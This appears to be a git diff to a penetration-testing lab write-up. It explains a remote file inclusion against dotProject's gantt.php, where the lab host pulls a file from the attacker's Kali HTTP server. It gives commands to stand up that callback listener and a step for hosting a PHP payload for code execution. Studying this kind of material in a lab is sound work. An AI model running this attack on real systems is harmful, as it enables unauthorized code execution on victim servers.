@@ -238,6 +238,18 @@ curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPco
 
 **Success signal:** response body contains **`RFI_MARKER_EPT`** (or obvious PHP **fatal** mentioning **`allow_url_include`**, **`Failed opening**`, **`http:// wrapper`**, which tells you the **`php.ini`** posture).
 
+#### Validation — RFI attempt **`102-003`** (`Connection refused`)
+
+![102-003 — gantt.php include() pulls http://Kali/marker.txt; stream: Connection refused](../Screenshots/102-003_rfi_gantt_include_connection_refused_tm6_afrocha.png)
+
+| What you see | What it means |
+|----------------|---------------|
+| **Warnings on `include()`** for a URL like **`http://<LHOST>:8080/marker.txt?/lib/jpgraph/...`** | **`dPconfig[root_dir]` is being applied** — the app builds **`include($root_dir.'/lib/jpgraph/...')`**, so your poisoned **`root_dir`** is **actually used**. That is strong evidence the **RFI primitive is live** (and **`allow_url_include`** is at least allowing the **attempt** to open an **`http://`** stream). |
+| **`failed to open stream: Connection refused`** | The **victim (`.102`)** tried to **connect outbound** to **`LHOST:8080`** and **nothing accepted** the TCP connection. This is usually **not** “RFI patched off” — it is **network / listener**: wrong **`LHOST`** for the lab route, **`python3 -m http.server`** not running, server bound to **127.0.0.1** only, **Kali firewall**, or **lab ACL** blocking **`.102` → your Kali IP**. |
+| **`Call to undefined function defVal()`** | The **jpgraph** include chain **did not complete** (dependencies missing after the failed remote step), so the script dies later — **expected** until the include path works. |
+
+**Fix the callback, then retry:** on Kali use the **VPN / lab interface IP** (`ip -br a`), **`python3 -m http.server 8080 --bind 0.0.0.0`**, confirm **`ss -tlnp | grep 8080`** shows a listener, and from another host on the same segment **`curl http://<LHOST>:8080/marker.txt`** if possible. Re-run the same **`curl`** to **`gantt.php`**.
+
 **3 — If remote include works and course allows code execution:** host a **`<?php … ?>`** file on **`LHOST`** and repeat (only if **`allow_url_include`** allows execution — many configs do **not**); otherwise pivot to **LFI**/local tricks per **`searchsploit -x`**.
 
 ### Recon — `curl /cgi-bin` (404; headers + error body)
